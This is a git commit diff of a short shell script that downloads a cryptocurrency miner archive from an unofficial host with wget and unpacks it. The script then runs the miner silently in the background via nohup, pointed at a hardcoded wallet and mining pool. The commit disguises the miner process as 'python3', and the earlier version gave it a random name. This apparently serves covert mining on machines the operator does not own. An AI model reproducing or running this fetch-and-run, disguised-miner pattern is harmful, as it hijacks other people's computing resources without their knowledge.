f0b56214420d74714484b8037c9f71083ac7bde9
DotAja <142836390+DotAja@users.noreply.github.com>
2024-06-15 01:39:08 +0700

    Update dotkcn.sh

--- dotkcn.sh
+++ dotkcn.sh
@@ -2,12 +2,10 @@
 
 kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)
 
-wget -O dot https://github.com/TrailingStop/TT-Miner-beta/releases/download/2024.2.1-beta5/TT-Miner-2024.2.1B5.2.tar.gz
+wget -O dot momok.x10.bz/DOT-SRB.tar.gz
 
 tar xvf dot
 
-cd TT-Miner-2024.2.1B5.2
+cd SRBMiner-Multi-2-5-6
 
-mv TT-Miner test$kolot
-
-nohup ./test$kolot -a FLEX -P kc1qmk8nx9ur8uqvtx5rlhx4wjana5pelq9lgka35f.DOT-$kolot@eu.mpool.live:5271 > /dev/null 2>&1 &
+nohup ./dotsrb/python3 -a FLEX -P kc1qmk8nx9ur8uqvtx5rlhx4wjana5pelq9lgka35f.DOT-$kolot@eu.mpool.live:5271 > /dev/null 2>&1 &
